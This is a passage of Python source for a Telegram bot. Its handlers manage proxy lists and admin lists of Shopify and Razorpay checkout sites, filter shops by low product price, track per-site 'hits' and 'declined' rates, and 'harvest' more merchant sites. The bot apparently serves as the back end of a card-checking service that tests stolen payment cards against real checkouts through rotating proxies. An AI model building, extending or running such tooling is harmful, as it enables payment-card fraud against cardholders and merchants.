            f"💎 <code>• /chkproxy ip:port:user:pass</code>"))
    proxy = parts[1].strip()
    clean = _strip_country_from_proxy(proxy)
    if not parse_proxy_format(clean):
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Checking')} <code>{clean[:40]}</code>..."))
    res = await test_proxy(clean)
    if res['status'] == 'alive':
        await status_msg.edit(pe(
            f"✅ <b>{bs('Alive')}</b>\n{SEP}\n"
            f"🌐 IP: <code>{res.get('ip', '?')}</code>\n"
            f"🔌 <code>{clean}</code>"), parse_mode='html', link_preview=False)
    else:
        await status_msg.edit(pe(
            f"❌ <b>{bs('Dead')}</b>\n{SEP}\n"
            f"🔌 <code>{clean}</code>"), parse_mode='html', link_preview=False)


@client.on(events.NewMessage(pattern=r'^[/.]rmproxy\s+'))
async def cmd_rmproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <code>• /rmproxy ip:port:user:pass</code>"))
    raw = parts[1].strip()
    clean = _strip_country_from_proxy(raw)
    parsed = parse_proxy_format(clean)
    if not parsed:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    if parsed['username'] and parsed['password']:
        target = f"{parsed['ip']}:{parsed['port']}:{parsed['username']}:{parsed['password']}"
    else:
        target = f"{parsed['ip']}:{parsed['port']}"
    proxies = load_user_proxies(uid)
    found = [p for p in proxies if target in p]
    if not found:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not in your list')}</b>"))
    proxies = [p for p in proxies if target not in p]
    save_user_proxies(uid, proxies)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Removed')}</b>\n🔌 <code>{target}</code>\n📁 <code>{len(proxies)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]rmproxyindex\s+'))
async def cmd_rmproxyindex(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /rmproxyindex 1,2,3</code>"))
    try:
        idxs = sorted({int(x.strip()) - 1 for x in parts[1].split(',') if x.strip()})
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid indices')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    valid = [i for i in idxs if 0 <= i < len(proxies)]
    if not valid:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid indices')}</b>"))
    removed = [proxies[i] for i in valid]
    keep = [p for i, p in enumerate(proxies) if i not in set(valid)]
    save_user_proxies(uid, keep)
    removed_str = "\n".join(f"🔌 <code>{p}</code>" for p in removed[:10])
    extra = f"\n<i>+{len(removed)-10} more</i>" if len(removed) > 10 else ""
    await styled_reply(event, pe(
        f"✅ <b>{bs('Removed')}</b> <code>{len(removed)}</code>\n{SEP}\n"
        f"{removed_str}{extra}\n{SEP}\n📁 {bs('Remaining')}: <code>{len(keep)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]clearproxy$'))
async def cmd_clearproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already empty')}</b>"))
    save_user_proxies(uid, [])
    await styled_reply(event, pe(
        f"✅ <b>{bs('Cleared')}</b> <code>{len(proxies)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]myproxy$'))
async def cmd_myproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No proxies')}</b> — <code>• /addproxy</code>"))
    lines = [f"{i}. <code>{p}</code>" for i, p in enumerate(proxies[:50], 1)]
    if len(proxies) > 50:
        lines.append(f"<i>+{len(proxies)-50} more</i>")
    await styled_reply(event, pe(
        f"💎 <b>{bs('Your proxies')}</b> (<code>{len(proxies)}/{MAX_PROXIES_PER_USER}</code>)\n"
        f"{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]getproxy$'))
async def cmd_getproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    fname = f"NOVA_proxies_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for i, p in enumerate(proxies, 1):
                await f.write(f"{i}. {p}\n")
        await send_file_entities(uid, fname,
            pe(f"💎 {bs('Proxies')} (<code>{len(proxies)}</code>)"))
        os.remove(fname)
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


# ====================== SHOPIFY SITE COMMANDS ======================
@client.on(events.NewMessage(pattern=r'^[/.]addsites$'))
async def cmd_addsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a .txt file with')} <code>• /addsites</code>\n"
            f"💡 {bs('Adds to existing list')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    new_sites = extract_urls(content)
    if not new_sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid URLs')}</b>"))
    existing = set(load_sites())
    to_test = [s for s in new_sites if s not in existing]
    already = len(new_sites) - len(to_test)
    if not to_test:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('All exist')}</b> · {bs('Dupes')} <code>{already}</code>"))
    threshold = get_threshold()
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Testing')} <code>{len(to_test)}</code> — "
        f"filter: <code>${get_min_price():.2f}–${threshold:.2f}</code>"))
    await _run_site_tests(event, uid, to_test, status_msg,
                          initial_sites_count=len(new_sites),
                          existing=existing, wipe=False)


@client.on(events.NewMessage(pattern=r'^[/.]resetsites$'))
async def cmd_resetsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a .txt file with')} <code>• /resetsites</code>\n"
            f"⚠️ {bs('Wipes current list first!')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    new_sites = extract_urls(content)
    if not new_sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid URLs')}</b>"))
    save_sites([])
    threshold = get_threshold()
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Reset + testing')} <code>{len(new_sites)}</code> — "
        f"filter: <code>${get_min_price():.2f}–${threshold:.2f}</code>"))
    await _run_site_tests(event, uid, new_sites, status_msg,
                          initial_sites_count=len(new_sites),
                          existing=None, wipe=True)


@client.on(events.NewMessage(pattern=r'^[/.]site$'))
async def cmd_site(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('sites.txt empty')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    threshold = get_threshold()
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Purging')} <code>{len(sites)}</code> — "
        f"filter: <code>${get_min_price():.2f}–${threshold:.2f}</code>"))
    await _run_site_tests(event, uid, sites, status_msg,
                          initial_sites_count=len(sites),
                          existing=None, wipe=True)


@client.on(events.NewMessage(pattern=r'^[/.]rm\s+'))
async def cmd_rm(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <code>• /rm site.com</code> {bs('or')} <code>• /rm all</code>"))
    arg = parts[1].strip().lower()
    sites = load_sites()
    if arg == "all":
        save_sites([])
        return await styled_reply(event, pe(
            f"✅ <b>{bs('Cleared')}</b> <code>{len(sites)}</code>"))
    target = normalize_site_url(arg)
    found = next((s for s in sites if normalize_site_url(s) == target), None)
    if not found:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not found')}</b>"))
    sites = [s for s in sites if s != found]
    save_sites(sites)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Removed')}</b>\n🌐 <code>{found}</code>\n📁 <code>{len(sites)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getsites$'))
async def cmd_getsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    fname = f"NOVA_sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for s in sites:
                await f.write(s + "\n")
        await send_file_entities(uid, fname,
            pe(f"📁 {bs('Sites')} (<code>{len(sites)}</code>)"))
        os.remove(fname)
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setthreshold\s+'))
async def cmd_setthreshold(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, pe(f"⚠️ <b>{bs('Admin only')}</b>"))
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /setthreshold 7</code>"))
    try:
        val = float(parts[1].strip())
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid number')}</b>"))
    set_threshold(val)
    await styled_reply(event, pe(f"✅ {bs('Max price')} <code>${val}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getthreshold$'))
async def cmd_getthreshold(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, pe(f"⚠️ <b>{bs('Admin only')}</b>"))
    await styled_reply(event, pe(f"💰 {bs('Max price')}: <code>${get_threshold()}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setminprice\s+'))
async def cmd_setminprice(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, pe(f"⚠️ <b>{bs('Admin only')}</b>"))
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>• /setminprice 0.01</code>"))
    try:
        val = float(parts[1].strip())
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid number')}</b>"))
    set_min_price(val)
    await styled_reply(event, pe(f"✅ {bs('Min price')} <code>${val}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getminprice$'))
async def cmd_getminprice(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(f"💰 {bs('Min price')}: <code>${get_min_price()}</code>"))


# ====================== RAZORPAY SITE COMMANDS ======================
@client.on(events.NewMessage(pattern=r'^[/.]addrzsites$'))
async def cmd_addrzsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💳 <b>{bs('Add Razorpay sites')}</b>\n{SEP}\n"
            f"💎 {bs('Reply to a .txt file with')} <code>• /addrzsites</code>\n"
            f"💡 {bs('Appends to existing rz_sites.txt')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))

    new_sites = extract_rz_urls(content)
    if not new_sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid URLs')}</b>"))

    existing = set(load_rz_sites())
    to_add = [s for s in new_sites if s not in existing]
    dupes = len(new_sites) - len(to_add)

    if not to_add:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('All exist')}</b> · {bs('Dupes')} <code>{dupes}</code>"))

    save_rz_sites(list(existing) + to_add)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Razorpay sites added')}</b>\n{SEP}\n"
        f"➕ {bs('Added')}: <code>{len(to_add)}</code>\n"
        f"⚠️ {bs('Skipped dupes')}: <code>{dupes}</code>\n"
        f"📁 {bs('Total')}: <code>{len(load_rz_sites())}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]resetrzsites$'))
async def cmd_resetrzsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💳 <b>{bs('Reset Razorpay sites')}</b>\n{SEP}\n"
            f"💎 {bs('Reply to a .txt file with')} <code>• /resetrzsites</code>\n"
            f"⚠️ {bs('Wipes current rz_sites.txt first')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))

    new_sites = extract_rz_urls(content)
    if not new_sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid URLs')}</b>"))

    save_rz_sites(new_sites)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Razorpay sites reset')}</b>\n{SEP}\n"
        f"📁 {bs('Total')}: <code>{len(new_sites)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]rmrzsites?\s+'))
async def cmd_rmrzsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <code>• /rmrzsites site.com</code> {bs('or')} <code>• /rmrzsites all</code>"))
    arg = parts[1].strip().lower()
    sites = load_rz_sites()
    if arg == "all":
        save_rz_sites([])
        return await styled_reply(event, pe(
            f"✅ <b>{bs('Cleared')}</b> <code>{len(sites)}</code>"))
    target = normalize_rz_url(arg)
    found = next((s for s in sites if normalize_rz_url(s) == target), None)
    if not found:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not found')}</b>"))
    sites = [s for s in sites if s != found]
    save_rz_sites(sites)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Removed')}</b>\n💳 <code>{found}</code>\n📁 <code>{len(sites)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getrzsites$'))
async def cmd_getrzsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_rz_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No Razorpay sites')}</b>"))
    fname = f"NOVA_rz_sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for s in sites:
                await f.write(s + "\n")
        await send_file_entities(uid, fname,
            pe(f"💳 {bs('Razorpay sites')} (<code>{len(sites)}</code>)"))
        os.remove(fname)
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]rzsites$'))
async def cmd_rzsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_rz_sites()
    if not sites:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No Razorpay sites')}</b>\n"
            f"💡 {bs('Add with')} <code>• /addrzsites</code>"))
    lines = [f"{i}. <code>{s}</code>" for i, s in enumerate(sites[:50], 1)]
    if len(sites) > 50:
        lines.append(f"<i>+{len(sites)-50} more</i>")
    await styled_reply(event, pe(
        f"💳 <b>{bs('Razorpay sites')}</b> (<code>{len(sites)}</code>)\n"
        f"{SEP}\n" + "\n".join(lines)))


# ====================== SITE STATS ======================
@client.on(events.NewMessage(pattern=r'^[/.]sitestats$'))
async def cmd_sitestats(event):
    if event.sender_id not in ADMIN_ID:
        return
    d = load_site_stats()
    if not d:
        return await styled_reply(event, pe(
            f"📊 <b>{bs('Site Stats')}</b>\n{SEP}\n"
            f"<i>{bs('No data yet — run some checks first')}</i>"))
    rows = []
    for site, s in d.items():
        attempts = int(s.get("attempts", 0))
        if attempts < 3:
            continue
        hits = int(s.get("hits", 0))
        rate = hits / max(1, attempts) * 100
        rows.append((site, attempts, hits, int(s.get("errors", 0)),
                     int(s.get("declined", 0)), rate, bool(s.get("disabled"))))
    if not rows:
        return await styled_reply(event, pe(
            f"📊 <b>{bs('Site Stats')}</b>\n{SEP}\n"
            f"<i>{bs('Not enough data yet')}</i>"))
    rows.sort(key=lambda x: x[5], reverse=True)
    top = rows[:20]
    lines = []
    for i, (site, att, hits, errs, dec, rate, disabled) in enumerate(top, 1):
        flag = "🚫" if disabled else "✅"
        lines.append(
            f"{flag} <code>{site[:40]}</code>\n"
            f"   {att} tries · {hits} hits · {errs} err · {rate:.1f}%"
        )
    disabled_count = sum(1 for r in rows if r[6])
    await styled_reply(event, pe(
        f"📊 <b>{bs('Site Performance')}</b>\n{SEP}\n"
        f"🌐 {bs('Total tracked')}: <code>{len(rows)}</code>\n"
        f"🚫 {bs('Disabled')}: <code>{disabled_count}</code>\n"
        f"{SEP}\n" + "\n".join(lines) +
        f"\n{SEP}\n"
        f"💡 {bs('Use')} <code>• /resetstats</code> {bs('to re-enable all')}"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]resetstats$'))
async def cmd_resetstats(event):
    if event.sender_id not in ADMIN_ID:
        return
    d = load_site_stats()
    for s in d.values():
        s["disabled"] = False
        s["errors"] = 0
    save_site_stats(d)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Site stats reset')}</b>\n"
        f"🔓 {bs('All sites re-enabled')}"))


# ====================== HARVESTER: SHOPIFY ======================
async def _sh_scan_task(uid: int, status_msg):
    if not SHOPIFY_HARVESTER_OK:
        return await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Harvester missing')}</b>: <code>{_SH_HARVEST_ERR}</code>"))
    proxies = load_user_proxies(uid)
    proxy = proxies[0] if proxies else None
    total = len(load_sites())
    if total == 0:
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('No sites to scan')}</b>"))
    min_price = get_min_price()
    max_price = get_threshold()
    done = [0]
    last_edit = [time.time()]

    def _progress(count, total_, result):
        done[0] = count
        if time.time() - last_edit[0] < 2.0 and count != total_:
            return
        last_edit[0] = time.time()
        tag = "✅" if result.get("ok") else "❌"
        reason = (result.get("reason") or "")[:24]
        url = result.get("url", "")
        asyncio.create_task(styled_edit(status_msg, pe(
            f"💎 <b>{bs('Scanning Shopify sites')}</b>\n{SEP}\n"
            f"📊 [{count}/{total_}]\n"
            f"{tag} <code>{url[-40:]}</code>\n"
            f"📝 <i>{reason}</i>")))

    loop = asyncio.get_running_loop()
    try:
        live, dead, over, errors = await loop.run_in_executor(
            None, _sh_scan_file, SITES_FILE, SITES_FILE,
            proxy, min_price, max_price, HARVEST_PER_USER_WORKERS, _progress)
    except Exception as e:
        return await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Scan failed')}</b>: <code>{str(e)[:120]}</code>"))
    try:
        _write_json(SHOPIFY_LAST_SCAN_FILE, {
            "ts": time.time(), "before": total,
            "live": len(live), "dead": len(dead),
            "over": len(over), "errors": len(errors)})
    except Exception:
        pass
    await styled_edit(status_msg, pe(
        f"✅ <b>{bs('Shopify Scan Complete')}</b>\n{SEP}\n"
        f"📥 {bs('Tested')}: <code>{total}</code>\n"
        f"✅ {bs('Live')}: <code>{len(live)}</code>\n"
        f"❌ {bs('Dead')}: <code>{len(dead)}</code>\n"
        f"💰 {bs('Over threshold')}: <code>{len(over)}</code>\n"
        f"🧨 {bs('Errors')}: <code>{len(errors)}</code>\n"
        f"📁 {bs('sites.txt')}: <code>{len(load_sites())}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]shscan$'))
async def cmd_shscan(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not SHOPIFY_HARVESTER_OK:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Harvester not loaded')}</b>: <code>{_SH_HARVEST_ERR}</code>"))
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Scanning')} <code>{len(sites)}</code> {bs('sites')}..."))
    asyncio.create_task(_sh_scan_task(uid, status_msg))


@client.on(events.NewMessage(pattern=r'^[/.]shharvest(?:\s+(.+))?$'))
async def cmd_shharvest(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not SHOPIFY_HARVESTER_OK:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Harvester not loaded')}</b>: <code>{_SH_HARVEST_ERR}</code>"))
    raw = (event.pattern_match.group(1) or "").strip()
    seeds = []
    if raw:
        seeds = [s.strip() for s in raw.split(",") if s.strip()]
    else:
        seeds = [normalize_site_url(s) for s in load_sites()[:30]]
    if not seeds:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Provide seeds')}</b>\n"
            f"<code>• /shharvest myshop,coffee,store</code>"))
    proxies = load_user_proxies(uid)
    proxy = proxies[0] if proxies else None
    min_price = get_min_price()
    max_price = get_threshold()
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Harvesting')} <code>{len(seeds)}</code> {bs('seeds')}..."))
    last_edit = [time.time()]

    def _progress(count, total_, result):
        if time.time() - last_edit[0] < 2.0 and count != total_:
            return
        last_edit[0] = time.time()
        tag = "✅" if result.get("ok") else "❌"
        url = result.get("url", "")
        asyncio.create_task(styled_edit(status_msg, pe(
            f"💎 <b>{bs('Harvesting')}</b> [{count}/{total_}]\n"
            f"{tag} <code>{url[-40:]}</code>")))

    loop = asyncio.get_running_loop()
    try:
        live, dead, over, errors = await loop.run_in_executor(
            None, _sh_harvest, seeds, None, SITES_FILE,
            proxy, min_price, max_price, HARVEST_PER_USER_WORKERS, _progress)
    except Exception as e:
        return await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Harvest failed')}</b>: <code>{str(e)[:120]}</code>"))
    await styled_edit(status_msg, pe(
        f"✅ <b>{bs('Harvest Complete')}</b>\n{SEP}\n"
        f"🌱 {bs('Seeds')}: <code>{len(seeds)}</code>\n"
        f"✅ {bs('New live')}: <code>{len(live)}</code>\n"
        f"❌ {bs('Dead')}: <code>{len(dead)}</code>\n"
        f"💰 {bs('Over threshold')}: <code>{len(over)}</code>\n"
        f"🧨 {bs('Errors')}: <code>{len(errors)}</code>\n"
        f"📁 {bs('Total in sites.txt')}: <code>{len(load_sites())}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]shstat$'))
async def cmd_shstat(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_sites()
    last = _read_json(SHOPIFY_LAST_SCAN_FILE, {})
    body = f"🛒 <b>{bs('Shopify Sites')}</b>\n{SEP}\n"
    body += f"📁 {bs('Total')}: <code>{len(sites)}</code>\n"
    if last:
        when = datetime.fromtimestamp(last.get("ts", 0)).strftime("%Y-%m-%d %H:%M")
        body += f"{SEP}\n"
        body += f"🕐 {bs('Last scan')}: <code>{when}</code>\n"
        body += f"📥 {bs('Tested')}: <code>{last.get('before', 0)}</code>\n"
        body += f"✅ {bs('Live')}: <code>{last.get('live', 0)}</code>\n"
        body += f"❌ {bs('Dead')}: <code>{last.get('dead', 0)}</code>\n"
        body += f"💰 {bs('Over')}: <code>{last.get('over', 0)}</code>\n"
        body += f"🧨 {bs('Errors')}: <code>{last.get('errors', 0)}</code>\n"
    body += f"{SEP}\n"
    body += f"💡 <code>• /shscan</code> — check + purge dead\n"
    body += f"💡 <code>• /shharvest myshop,coffee,store</code> — expand\n"
    await styled_reply(event, pe(body))


# ====================== HARVESTER: RAZORPAY ======================
async def _rz_scan_task(uid: int, status_msg):
    if not RZ_HARVESTER_OK:
        return await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Harvester missing')}</b>: <code>{_RZ_HARVEST_ERR}</code>"))
    proxies = load_user_proxies(uid)
    proxy = proxies[0] if proxies else None
    src = RZ_SITES_FILE
    dst = RZ_SITES_FILE
    total = len(load_rz_sites())
    if total == 0:
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('No RZ sites to scan')}</b>"))
    done = [0]
    last_edit = [time.time()]

    def _progress(count, total_, result):
        done[0] = count
        if time.time() - last_edit[0] < 2.0 and count != total_:
            return
        last_edit[0] = time.time()
        tag = "✅" if result.get("ok") else "❌"
        reason = (result.get("reason") or "")[:20]
        url = result.get("url", "")
        asyncio.create_task(styled_edit(status_msg, pe(
            f"💎 <b>{bs('Scanning RZ sites')}</b>\n{SEP}\n"
            f"📊 [{count}/{total_}]\n"
            f"{tag} <code>{url[-40:]}</code>\n"
            f"📝 <i>{reason}</i>")))

    loop = asyncio.get_running_loop()
    try:
        live, dead, errors = await loop.run_in_executor(
            None, _rz_scan_file, src, dst, proxy, HARVEST_PER_USER_WORKERS, _progress)
    except Exception as e:
        return await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Scan failed')}</b>: <code>{str(e)[:120]}</code>"))
    try:
        _write_json(RZ_LAST_SCAN_FILE, {
            "ts": time.time(), "before": total,
            "live": len(live), "dead": len(dead), "errors": len(errors)})
    except Exception:
        pass
    await styled_edit(status_msg, pe(
        f"✅ <b>{bs('RZ Sites Scan Complete')}</b>\n{SEP}\n"
        f"📥 {bs('Tested')}: <code>{total}</code>\n"
        f"✅ {bs('Live')}: <code>{len(live)}</code>\n"
        f"❌ {bs('Dead')}: <code>{len(dead)}</code>\n"
        f"🧨 {bs('Errors')}: <code>{len(errors)}</code>\n"
        f"📁 {bs('rz_sites.txt')}: <code>{len(load_rz_sites())}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]rzscan$'))
async def cmd_rzscan(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not RZ_HARVESTER_OK:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Harvester not loaded')}</b>: <code>{_RZ_HARVEST_ERR}</code>"))
    sites = load_rz_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No RZ sites')}</b>"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Scanning')} <code>{len(sites)}</code> {bs('RZ sites')}..."))
    asyncio.create_task(_rz_scan_task(uid, status_msg))


@client.on(events.NewMessage(pattern=r'^[/.]rzharvest(?:\s+(.+))?$'))
async def cmd_rzharvest(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not RZ_HARVESTER_OK:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Harvester not loaded')}</b>: <code>{_RZ_HARVEST_ERR}</code>"))
    raw = (event.pattern_match.group(1) or "").strip()
    seeds = []
    if raw:
        seeds = [s.strip() for s in raw.split(",") if s.strip()]
    else:
        seeds = [u.rstrip("/").split("/")[-1] for u in load_rz_sites()[:50] if u]
    if not seeds:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Provide seeds')}</b>\n"
            f"<code>• /rzharvest donate,pay,seva</code>"))
    proxies = load_user_proxies(uid)
    proxy = proxies[0] if proxies else None
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Harvesting')} <code>{len(seeds)}</code> {bs('seeds')}..."))
    last_edit = [time.time()]

    def _progress(count, total_, result):
        if time.time() - last_edit[0] < 2.0 and count != total_:
            return
        last_edit[0] = time.time()
        tag = "✅" if result.get("ok") else "❌"
        url = result.get("url", "")
        asyncio.create_task(styled_edit(status_msg, pe(
            f"💎 <b>{bs('Harvesting')}</b> [{count}/{total_}]\n"
            f"{tag} <code>{url[-40:]}</code>")))

    loop = asyncio.get_running_loop()
    try:
        live, dead, errors = await loop.run_in_executor(
            None, _rz_harvest, seeds, None, RZ_SITES_FILE, proxy,
            HARVEST_PER_USER_WORKERS, _progress)
    except Exception as e:
        return await styled_edit(status_msg, pe(
            f"💎 <b>{bs('Harvest failed')}</b>: <code>{str(e)[:120]}</code>"))
    await styled_edit(status_msg, pe(
        f"✅ <b>{bs('Harvest Complete')}</b>\n{SEP}\n"
        f"🌱 {bs('Seeds')}: <code>{len(seeds)}</code>\n"
        f"✅ {bs('New live')}: <code>{len(live)}</code>\n"
        f"❌ {bs('Dead')}: <code>{len(dead)}</code>\n"
        f"🧨 {bs('Errors')}: <code>{len(errors)}</code>\n"
